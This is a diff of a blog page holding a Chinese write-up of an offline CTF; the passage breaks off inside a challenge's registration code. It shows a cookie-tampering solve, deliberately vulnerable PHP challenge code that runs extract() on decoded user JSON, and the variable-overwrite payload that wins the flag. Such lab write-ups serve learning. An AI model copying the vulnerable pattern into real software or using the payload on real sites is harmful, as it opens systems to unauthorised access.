@@ -1,66 +1,30 @@
 <!DOCTYPE html>
+<html class="has-navbar-fixed-top">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+<title>川师线下CTF Writeup - Threezh1&#39;s blog</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.css">
 
 
 
 
-
-<html lang="Chinese">
-<head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/head.jpg?v=7.3.0">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/head.jpg?v=7.3.0">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/head.jpg?v=7.3.0">
-  <link rel="mask-icon" href="/images/head.jpg?v=7.3.0" color="#222">
-
-<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+<meta name="description" content="Share learn & Share life.">
 
 
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+<meta name="keywords" content="Threezh1">
 
 
-<script id="hexo-configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Pisces',
-    version: '7.3.0',
-    exturl: false,
-    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
-    copycode: {"enable":false,"show_result":false,"style":null},
-    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
-    bookmark: {"enable":false,"color":"#222","save":"auto"},
-    fancybox: false,
-    mediumzoom: false,
-    lazyload: false,
-    pangu: false,
-    algolia: {
-      appID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    },
-    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
-    path: '',
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    translation: {
-      copy_button: 'Kopieren',
-      copy_success: 'Kopiert',
-      copy_failure: 'Kopieren fehlgeschlagen'
-    }
-  };
-</script>
 
-  <meta name="description" content="说在前面这次和队友一起去川师打了一次线下的CTF。虽然比赛中很多题都没做出来，但学到很多东西。赛后出题师傅也给出了源码和Writeup，抓住机会总结学习。 重新搭建题目的环境有点困难，所以还是有两题无法进行复现。  Web418打开网页后是一个418的错误页面。  Google了一下418错误 “ERR！418 我是茶壶”起源 “错误 418 我是茶壶”消息不是标准的服务器错误类型，这是 1998">
-<meta name="keywords" content="Writeup">
+    <meta name="description" content="&amp;#x8BF4;&amp;#x5728;&amp;#x524D;&amp;#x9762;&amp;#x8FD9;&amp;#x6B21;&amp;#x548C;&amp;#x961F;&amp;#x53CB;&amp;#x4E00;&amp;#x8D77;&amp;#x53BB;&amp;#x5DDD;&amp;#x5E08;&amp;#x6253;&amp;#x4E86;&amp;#x4E00;&amp;#x6B21;&amp;#x7EBF;&amp;#x4E0B;&amp;#x7684;CTF&amp;#x3002;&amp;#x867D;&amp;#x7136;&amp;#x6B">
+<meta name="keywords" content="CTF,Writeup">
 <meta property="og:type" content="article">
 <meta property="og:title" content="川师线下CTF Writeup">
 <meta property="og:url" content="http://yoursite.com/2019/05/15/川师线下CTF-Web-Writeup/index.html">
 <meta property="og:site_name" content="Threezh1&#39;s blog">
-<meta property="og:description" content="说在前面这次和队友一起去川师打了一次线下的CTF。虽然比赛中很多题都没做出来，但学到很多东西。赛后出题师傅也给出了源码和Writeup，抓住机会总结学习。 重新搭建题目的环境有点困难，所以还是有两题无法进行复现。  Web418打开网页后是一个418的错误页面。  Google了一下418错误 “ERR！418 我是茶壶”起源 “错误 418 我是茶壶”消息不是标准的服务器错误类型，这是 1998">
+<meta property="og:description" content="&amp;#x8BF4;&amp;#x5728;&amp;#x524D;&amp;#x9762;&amp;#x8FD9;&amp;#x6B21;&amp;#x548C;&amp;#x961F;&amp;#x53CB;&amp;#x4E00;&amp;#x8D77;&amp;#x53BB;&amp;#x5DDD;&amp;#x5E08;&amp;#x6253;&amp;#x4E86;&amp;#x4E00;&amp;#x6B21;&amp;#x7EBF;&amp;#x4E0B;&amp;#x7684;CTF&amp;#x3002;&amp;#x867D;&amp;#x7136;&amp;#x6B">
 <meta property="og:locale" content="Chinese">
 <meta property="og:image" content="https://i.loli.net/2019/05/17/5cde2430300e851524.jpg">
 <meta property="og:image" content="https://i.loli.net/2019/05/17/5cde24303bb8224199.jpg">
@@ -73,284 +37,189 @@
 <meta property="og:image" content="http://yoursite.com/2019/05/15/川师线下CTF-Web-Writeup/![web5_tpvip.jpg](https://i.loli.net/2019/05/17/5cde24dd697f768705.jpg">
 <meta property="og:image" content="https://i.loli.net/2019/05/17/5cde24dd77fb099016.jpg">
 <meta property="og:image" content="https://i.loli.net/2019/05/17/5cde24dd7c86615595.jpg">
-<meta property="og:updated_time" content="2019-08-23T06:19:32.563Z">
+<meta property="og:updated_time" content="2020-02-12T14:07:14.822Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="川师线下CTF Writeup">
-<meta name="twitter:description" content="说在前面这次和队友一起去川师打了一次线下的CTF。虽然比赛中很多题都没做出来，但学到很多东西。赛后出题师傅也给出了源码和Writeup，抓住机会总结学习。 重新搭建题目的环境有点困难，所以还是有两题无法进行复现。  Web418打开网页后是一个418的错误页面。  Google了一下418错误 “ERR！418 我是茶壶”起源 “错误 418 我是茶壶”消息不是标准的服务器错误类型，这是 1998">
+<meta name="twitter:description" content="&amp;#x8BF4;&amp;#x5728;&amp;#x524D;&amp;#x9762;&amp;#x8FD9;&amp;#x6B21;&amp;#x548C;&amp;#x961F;&amp;#x53CB;&amp;#x4E00;&amp;#x8D77;&amp;#x53BB;&amp;#x5DDD;&amp;#x5E08;&amp;#x6253;&amp;#x4E86;&amp;#x4E00;&amp;#x6B21;&amp;#x7EBF;&amp;#x4E0B;&amp;#x7684;CTF&amp;#x3002;&amp;#x867D;&amp;#x7136;&amp;#x6B">
 <meta name="twitter:image" content="https://i.loli.net/2019/05/17/5cde2430300e851524.jpg">
-  <link rel="canonical" href="http://yoursite.com/2019/05/15/川师线下CTF-Web-Writeup/">
-
-
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome: false,
-    isPost: true,
-    isPage: false,
-    isArchive: false
-  };
-</script>
-
-  <title>川师线下CTF Writeup | Threezh1's blog</title>
-  <meta name="generator" content="Hexo 3.8.0">
-  
-
-
-  <script>
-    var _hmt = _hmt || [];
-    (function() {
-      var hm = document.createElement("script");
-      hm.src = "https://hm.baidu.com/hm.js?41896264c6b7bfbb2d9ae9719e4440c2";
-      var s = document.getElementsByTagName("script")[0];
-      s.parentNode.insertBefore(hm, s);
-    })();
-  </script>
 
 
 
 
 
+<link rel="icon" href="/favicon.png">
 
-  <noscript>
-  <style>
-  .use-motion .motion-element,
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
 
-  .use-motion .logo,
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/bulma/0.6.2/css/bulma.min.css">
 
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/css/justifiedGallery.min.css">
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css">
+
+<link rel="stylesheet" href="/css/style.css">
+
+<script defer src="//use.fontawesome.com/releases/v5.0.8/js/all.js"></script>
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
 
 </head>
-
-<body itemscope itemtype="http://schema.org/WebPage" lang="Chinese">
-  <div class="container use-motion">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta">
-
-    <div>
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Threezh1's blog</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-        <p class="site-subtitle">分享学习、分享想法</p>
-      
-  </div>
-
-  <div class="site-nav-toggle">
-    <button aria-label="Navigationsleiste an/ausschalten">
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
-  </div>
-</div>
-
-
-<nav class="site-nav">
-  
-  <ul id="menu" class="menu">
-      
-      
-      
-        
-        <li class="menu-item menu-item-home">
-      
+<body>
     
-
-    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>
-
-  </li>
-      
-      
-      
-        
-        <li class="menu-item menu-item-archives">
-      
-    
-
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>
-
-  </li>
-      
-      
-      
-        
-        <li class="menu-item menu-item-threeday">
-      
-    
-
-    <a href="http://119.3.219.188/" rel="noopener" target="_blank"><i class="menu-item-icon fa fa-fw fa-Threeday"></i> <br>Threeday</a>
-
-  </li>
-  </ul>
-
-</nav>
-</div>
-    </header>
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-            
-
-          <div id="content" class="content page-post-detail">
-            
-
-  <div id="posts" class="posts-expand">
-    
-
-  <article class="post" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/15/川师线下CTF-Web-Writeup/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Threezh1">
-      <meta itemprop="description" content="Share learn & Share life.">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Threezh1's blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">川师线下CTF Writeup
-
-          
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Veröffentlicht am</span>
-
-              
+<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a class="navbar-item navbar-logo" href="/">
                 
-              
-
-              <time title="Erstellt: 2019-05-15 12:00:00" itemprop="dateCreated datePublished" datetime="2019-05-15T12:00:00+08:00">2019-05-15</time>
-            </span>
-          
-            
-
-            
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">Bearbeitet am</span>
-                <time title="Geändert am: 2019-08-23 14:19:32" itemprop="dateModified" datetime="2019-08-23T14:19:32+08:00">2019-08-23</time>
-              </span>
-            
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">in</span>
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Writeup/" itemprop="url" rel="index"><span itemprop="name">Writeup</span></a></span>
-
+                <img src="/images/logo.png" alt height="28">
                 
-                
-              
-            </span>
-          
-
-          
-
+            </a>
+            <div class="navbar-burger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
         </div>
-      </header>
+        
+        <div class="navbar-menu navbar-start">
+            
+            <a class="navbar-item " href="/archives">归档</a>
+            
+            <a class="navbar-item " href="/Projects">项目</a>
+            
+            <a class="navbar-item " href="/Life">生活</a>
+            
+            <a class="navbar-item " href="/Photography">摄影</a>
+            
+            <a class="navbar-item " href="/About">关于</a>
+            
+            <a class="navbar-item " href="http://119.3.219.188/">Threeday</a>
+            
+        </div>
+        
+        <div class="navbar-menu navbar-end">
+            
+            <a class="navbar-item search" title="Buscar" href="javascript:;">
+                <i class="fas fa-search"></i>
+            </a>
+            
+            
+            
+            <a class="navbar-item" title="GitHub" href="https://github.com/Threezh1">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+               
+            
+        </div>
+    </div>
+</nav>
 
+    <section class="section">
+    <div class="container">
+    <article class="article content gallery" itemscope itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
+            川师线下CTF Writeup
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            <time datetime="2019-05-15T04:00:00.000Z" itemprop="datePublished">May 15 2019</time>
+        </span>
+        
+        <span class="column is-narrow article-category">
+            <i class="far fa-folder"></i>
+            <a class="article-category-link" href="/categories/技术文章/">技术文章</a>
+        </span>
+        
+        
+        <span class="column is-narrow">
+            
+            
+            11 minutes de lectura (Alrededor de 1677 palabras)
+        </span>
+        
+    </div>
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
     
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-        <h2 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h2><p>这次和队友一起去川师打了一次线下的CTF。虽然比赛中很多题都没做出来，但学到很多东西。赛后出题师傅也给出了源码和Writeup，抓住机会总结学习。</p>
-<p>重新搭建题目的环境有点困难，所以还是有两题无法进行复现。 </p>
-<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="418"><a href="#418" class="headerlink" title="418"></a>418</h3><p>打开网页后是一个418的错误页面。</p>
+        <h2 id="&#x8BF4;&#x5728;&#x524D;&#x9762;"><a href="#&#x8BF4;&#x5728;&#x524D;&#x9762;" class="headerlink" title="&#x8BF4;&#x5728;&#x524D;&#x9762;"></a>&#x8BF4;&#x5728;&#x524D;&#x9762;</h2><p>&#x8FD9;&#x6B21;&#x548C;&#x961F;&#x53CB;&#x4E00;&#x8D77;&#x53BB;&#x5DDD;&#x5E08;&#x6253;&#x4E86;&#x4E00;&#x6B21;&#x7EBF;&#x4E0B;&#x7684;CTF&#x3002;&#x867D;&#x7136;&#x6BD4;&#x8D5B;&#x4E2D;&#x5F88;&#x591A;&#x9898;&#x90FD;&#x6CA1;&#x505A;&#x51FA;&#x6765;&#xFF0C;&#x4F46;&#x5B66;&#x5230;&#x5F88;&#x591A;&#x4E1C;&#x897F;&#x3002;&#x8D5B;&#x540E;&#x51FA;&#x9898;&#x5E08;&#x5085;&#x4E5F;&#x7ED9;&#x51FA;&#x4E86;&#x6E90;&#x7801;&#x548C;Writeup&#xFF0C;&#x6293;&#x4F4F;&#x673A;&#x4F1A;&#x603B;&#x7ED3;&#x5B66;&#x4E60;&#x3002;</p>
+<p>&#x91CD;&#x65B0;&#x642D;&#x5EFA;&#x9898;&#x76EE;&#x7684;&#x73AF;&#x5883;&#x6709;&#x70B9;&#x56F0;&#x96BE;&#xFF0C;&#x6240;&#x4EE5;&#x8FD8;&#x662F;&#x6709;&#x4E24;&#x9898;&#x65E0;&#x6CD5;&#x8FDB;&#x884C;&#x590D;&#x73B0;&#x3002;<br><a id="more"></a></p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="418"><a href="#418" class="headerlink" title="418"></a>418</h3><p>&#x6253;&#x5F00;&#x7F51;&#x9875;&#x540E;&#x662F;&#x4E00;&#x4E2A;418&#x7684;&#x9519;&#x8BEF;&#x9875;&#x9762;&#x3002;</p>
 <p><img src="https://i.loli.net/2019/05/17/5cde2430300e851524.jpg" alt="pic"></p>
-<p>Google了一下418错误</p>
-<pre><code>“ERR！418 我是茶壶”起源
-“错误 418 我是茶壶”消息不是标准的服务器错误类型，这是 1998 年的一个愚人节恶作剧，距今已有 20 年了。许多开发团队在他们的应用程序中实施了“错误 418 我是茶壶”的消息作为内部笑话，通常使用这个错误来处理未知来源的错误。
-</code></pre><p>又在cookie处发现了一个base64加密的值： 解密后为：coffee</p>
+<p>Google&#x4E86;&#x4E00;&#x4E0B;418&#x9519;&#x8BEF;</p>
+<pre><code>&#x201C;ERR&#xFF01;418 &#x6211;&#x662F;&#x8336;&#x58F6;&#x201D;&#x8D77;&#x6E90;
+&#x201C;&#x9519;&#x8BEF; 418 &#x6211;&#x662F;&#x8336;&#x58F6;&#x201D;&#x6D88;&#x606F;&#x4E0D;&#x662F;&#x6807;&#x51C6;&#x7684;&#x670D;&#x52A1;&#x5668;&#x9519;&#x8BEF;&#x7C7B;&#x578B;&#xFF0C;&#x8FD9;&#x662F; 1998 &#x5E74;&#x7684;&#x4E00;&#x4E2A;&#x611A;&#x4EBA;&#x8282;&#x6076;&#x4F5C;&#x5267;&#xFF0C;&#x8DDD;&#x4ECA;&#x5DF2;&#x6709; 20 &#x5E74;&#x4E86;&#x3002;&#x8BB8;&#x591A;&#x5F00;&#x53D1;&#x56E2;&#x961F;&#x5728;&#x4ED6;&#x4EEC;&#x7684;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x4E2D;&#x5B9E;&#x65BD;&#x4E86;&#x201C;&#x9519;&#x8BEF; 418 &#x6211;&#x662F;&#x8336;&#x58F6;&#x201D;&#x7684;&#x6D88;&#x606F;&#x4F5C;&#x4E3A;&#x5185;&#x90E8;&#x7B11;&#x8BDD;&#xFF0C;&#x901A;&#x5E38;&#x4F7F;&#x7528;&#x8FD9;&#x4E2A;&#x9519;&#x8BEF;&#x6765;&#x5904;&#x7406;&#x672A;&#x77E5;&#x6765;&#x6E90;&#x7684;&#x9519;&#x8BEF;&#x3002;
+</code></pre><p>&#x53C8;&#x5728;cookie&#x5904;&#x53D1;&#x73B0;&#x4E86;&#x4E00;&#x4E2A;base64&#x52A0;&#x5BC6;&#x7684;&#x503C;&#xFF1A; &#x89E3;&#x5BC6;&#x540E;&#x4E3A;&#xFF1A;coffee</p>
 <p><img src="https://i.loli.net/2019/05/17/5cde24303bb8224199.jpg" alt="pic"></p>
-<p>用Brupsuite抓包后修改了cookie的值，网页提示：</p>
+<p>&#x7528;Brupsuite&#x6293;&#x5305;&#x540E;&#x4FEE;&#x6539;&#x4E86;cookie&#x7684;&#x503C;&#xFF0C;&#x7F51;&#x9875;&#x63D0;&#x793A;&#xFF1A;</p>
 <pre><code>Tell me what you want ! 
-</code></pre><p>于是我修改为flag的加密值，没用。在修改很多次之后队友解出来了。竟然是tea的base64。</p>
-<p>修改cookie后访问得到flag，这题，真的有点考脑洞。</p>
-<p><img src="https://i.loli.net/2019/05/17/5cde24303009952057.jpg" alt="pic"><br><a id="more"></a></p>
-<h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>是一道简单的代码审计题。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'config.php'</span>);</span><br><span class="line"></span><br><span class="line">$user = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_GET[<span class="string">'data'</span>])) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $data = json_decode($_GET[<span class="string">'data'</span>], <span class="keyword">true</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        $data = [];</span><br><span class="line">    &#125;</span><br><span class="line">    extract($data);</span><br><span class="line">    <span class="keyword">if</span>($users[$username]) &#123;		</span><br><span class="line">        $user = $username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($user==$usname) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"sicnuctf&#123;************&#125;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>参数data在经过json_decode之后进行了变量覆盖。</p>
-<p>构造payload：</p>
-<p>data = {“usname”:”123”, “users”:{“username”:”123”}, “user”:”123”}</p>
-<p>得到Flag</p>
+</code></pre><p>&#x4E8E;&#x662F;&#x6211;&#x4FEE;&#x6539;&#x4E3A;flag&#x7684;&#x52A0;&#x5BC6;&#x503C;&#xFF0C;&#x6CA1;&#x7528;&#x3002;&#x5728;&#x4FEE;&#x6539;&#x5F88;&#x591A;&#x6B21;&#x4E4B;&#x540E;&#x961F;&#x53CB;&#x89E3;&#x51FA;&#x6765;&#x4E86;&#x3002;&#x7ADF;&#x7136;&#x662F;tea&#x7684;base64&#x3002;</p>
+<p>&#x4FEE;&#x6539;cookie&#x540E;&#x8BBF;&#x95EE;&#x5F97;&#x5230;flag&#xFF0C;&#x8FD9;&#x9898;&#xFF0C;&#x771F;&#x7684;&#x6709;&#x70B9;&#x8003;&#x8111;&#x6D1E;&#x3002;</p>
+<p><img src="https://i.loli.net/2019/05/17/5cde24303009952057.jpg" alt="pic"></p>
+<h3 id="&#x7B7E;&#x5230;&#x9898;"><a href="#&#x7B7E;&#x5230;&#x9898;" class="headerlink" title="&#x7B7E;&#x5230;&#x9898;"></a>&#x7B7E;&#x5230;&#x9898;</h3><p>&#x662F;&#x4E00;&#x9053;&#x7B80;&#x5355;&#x7684;&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;&#x9898;&#x3002;</p>
+<figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-keyword">require</span>(<span class="hljs-string">&apos;config.php&apos;</span>);</span><br><span class="line"></span><br><span class="line">$user = <span class="hljs-keyword">null</span>;</span><br><span class="line"><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>($_GET[<span class="hljs-string">&apos;data&apos;</span>])) {</span><br><span class="line">    <span class="hljs-keyword">try</span> {</span><br><span class="line">        $data = json_decode($_GET[<span class="hljs-string">&apos;data&apos;</span>], <span class="hljs-keyword">true</span>);</span><br><span class="line">    } <span class="hljs-keyword">catch</span> (<span class="hljs-keyword">Exception</span> $e) {</span><br><span class="line">        $data = [];</span><br><span class="line">    }</span><br><span class="line">    extract($data);</span><br><span class="line">    <span class="hljs-keyword">if</span>($users[$username]) {		</span><br><span class="line">        $user = $username;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"><span class="hljs-keyword">if</span> ($user==$usname) {</span><br><span class="line">    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;sicnuctf{************}&quot;</span>;</span><br><span class="line">}</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x53C2;&#x6570;data&#x5728;&#x7ECF;&#x8FC7;json_decode&#x4E4B;&#x540E;&#x8FDB;&#x884C;&#x4E86;&#x53D8;&#x91CF;&#x8986;&#x76D6;&#x3002;</p>
+<p>&#x6784;&#x9020;payload&#xFF1A;</p>
+<p>data = {&#x201C;usname&#x201D;:&#x201D;123&#x201D;, &#x201C;users&#x201D;:{&#x201C;username&#x201D;:&#x201D;123&#x201D;}, &#x201C;user&#x201D;:&#x201D;123&#x201D;}</p>
+<p>&#x5F97;&#x5230;Flag</p>
 <p><img src="https://i.loli.net/2019/05/17/5cde2465d8f5995939.jpg" alt="pic"></p>
-<h3 id="PHP是世界上最好的语言"><a href="#PHP是世界上最好的语言" class="headerlink" title="PHP是世界上最好的语言"></a>PHP是世界上最好的语言</h3><p>用御剑，可以直接跑出登录，注册的源码地址，注册一个账号，登录进去可以拿到member.php的源码。</p>
+<h3 id="PHP&#x662F;&#x4E16;&#x754C;&#x4E0A;&#x6700;&#x597D;&#x7684;&#x8BED;&#x8A00;"><a href="#PHP&#x662F;&#x4E16;&#x754C;&#x4E0A;&#x6700;&#x597D;&#x7684;&#x8BED;&#x8A00;" class="headerlink" title="PHP&#x662F;&#x4E16;&#x754C;&#x4E0A;&#x6700;&#x597D;&#x7684;&#x8BED;&#x8A00;"></a>PHP&#x662F;&#x4E16;&#x754C;&#x4E0A;&#x6700;&#x597D;&#x7684;&#x8BED;&#x8A00;</h3><p>&#x7528;&#x5FA1;&#x5251;&#xFF0C;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8DD1;&#x51FA;&#x767B;&#x5F55;&#xFF0C;&#x6CE8;&#x518C;&#x7684;&#x6E90;&#x7801;&#x5730;&#x5740;&#xFF0C;&#x6CE8;&#x518C;&#x4E00;&#x4E2A;&#x8D26;&#x53F7;&#xFF0C;&#x767B;&#x5F55;&#x8FDB;&#x53BB;&#x53EF;&#x4EE5;&#x62FF;&#x5230;member.php&#x7684;&#x6E90;&#x7801;&#x3002;</p>
 <p>register.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">$pdo = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=***'</span>, <span class="string">'***'</span>, <span class="string">'***'</span>);</span><br><span class="line">&#125;<span class="keyword">catch</span> (<span class="keyword">Exception</span> $e)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'mysql connected error'</span>);</span><br><span class="line">&#125;					<span class="comment">//str_shuffle()随机地打乱字符串中的所有字符</span></span><br><span class="line">$admin = <span class="string">"sicnu"</span>.<span class="string">"#"</span>.str_shuffle(<span class="string">'hello_here_is_your_flag_but_it_no_easy'</span>);</span><br><span class="line">$username = (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) === <span class="keyword">true</span> &amp;&amp; $_POST[<span class="string">'username'</span>] !== <span class="string">''</span>) ? (string)$_POST[<span class="string">'username'</span>] : <span class="keyword">die</span>(<span class="string">'Missing username'</span>);</span><br><span class="line">$password = (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]) === <span class="keyword">true</span> &amp;&amp; $_POST[<span class="string">'password'</span>] !== <span class="string">''</span>) ? (string)$_POST[<span class="string">'password'</span>] : <span class="keyword">die</span>(<span class="string">'Missing password'</span>);</span><br><span class="line">$code = (<span class="keyword">isset</span>($_POST[<span class="string">'code'</span>]) === <span class="keyword">true</span>) ? (string)$_POST[<span class="string">'code'</span>] : <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strlen($username) &gt; <span class="number">16</span> || strlen($username) &gt; <span class="number">16</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'is too long'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sth = $pdo-&gt;prepare(<span class="string">'SELECT username FROM users WHERE username = :username'</span>);</span><br><span class="line">$sth-&gt;execute([<span class="string">':username'</span> =&gt; $username]);</span><br><span class="line"><span class="keyword">if</span> ($sth-&gt;fetch() !== <span class="keyword">false</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'username has been registered'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sth = $pdo-&gt;prepare(<span class="string">'INSERT INTO users (username, password) VALUES (:username, :password)'</span>);</span><br><span class="line">$sth-&gt;execute([<span class="string">':username'</span> 